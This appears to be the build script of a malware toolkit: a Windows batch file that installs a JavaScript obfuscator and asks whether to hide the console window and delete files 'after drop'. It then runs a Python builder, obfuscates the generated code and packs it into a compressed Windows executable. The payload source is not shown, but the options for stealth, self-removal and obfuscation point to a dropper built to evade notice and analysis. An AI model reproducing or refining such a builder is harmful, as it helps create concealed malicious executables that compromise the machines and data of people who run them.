@echo off
setlocal enabledelayedexpansion
chcp 65001 > nul

cd /d %~dp0

node -v
if %errorlevel% neq 0 (
    echo Node.js is not installed
    start https://nodejs.org/en/download
    pause
    exit
)

call npm install --save-dev javascript-obfuscator
if %errorlevel% neq 0 (
    echo npm install --save-dev javascript-obfuscator failed
    start https://nodejs.org/en/download
    pause
    exit
)

cls

set /p hideConsole=Hide console window? (y/n): 

if %hideConsole% == y (
    set "hideConsole=--hide"
) else (
    set "hideConsole="
)

set /p removeFiles=Remove files after drop? (y/n): 
if %removeFiles% == y (
    set "removeFiles=--remove"
) else (
    set "removeFiles="
)

python builder.py %hideConsole% %removeFiles%

if %errorlevel% neq 0 (
    echo Python build failed
    pause
    exit /b %errorlevel%
)

node src\obfuscator.js
if %errorlevel% neq 0 (
    echo Obfuscation failed
    pause
    exit /b %errorlevel%
)

cls

move /Y src\to_compile\main.js index.js > nul
if %errorlevel% neq 0 (
    echo Move failed
    pause
    exit /b %errorlevel%
)

call npm install -g pkg

pkg index.js --compress GZip -t node18-win
if %errorlevel% neq 0 (
    echo pkg failed
    pause
    exit /b %errorlevel%
)

pause
exit